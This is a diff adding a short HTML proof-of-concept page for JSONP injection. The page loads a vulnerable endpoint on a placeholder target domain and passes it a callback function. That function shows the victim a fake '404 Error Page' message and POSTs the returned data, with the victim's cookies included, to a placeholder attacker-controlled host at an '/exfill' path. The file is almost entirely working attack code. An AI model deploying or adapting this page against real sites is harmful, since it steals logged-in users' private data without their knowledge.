@@ -1,0 +1,17 @@
+<script type="text/javascript">
+function my_jsfunction(data){
+ document.write("<h3>404 Error Page</h3><p>Try again later</p><br/>");
+ fetch('http://CONTROLED_DOMAIN.com:5678/exfill', {
+	credentials: 'include',
+	mode: 'no-cors', //avoid OPTIONS preflight.
+    method: 'POST',
+    headers: {
+        'Accept': 'application/json',
+    },
+    body: JSON.stringify(data)
+})
+}
+</script>
+<h1>JSONP Injection PoC</h1>
+<script src='https://TARGET_DOMAIN.com/vulnApp?JSON_CALLBACK=my_jsfunction'></script>
+
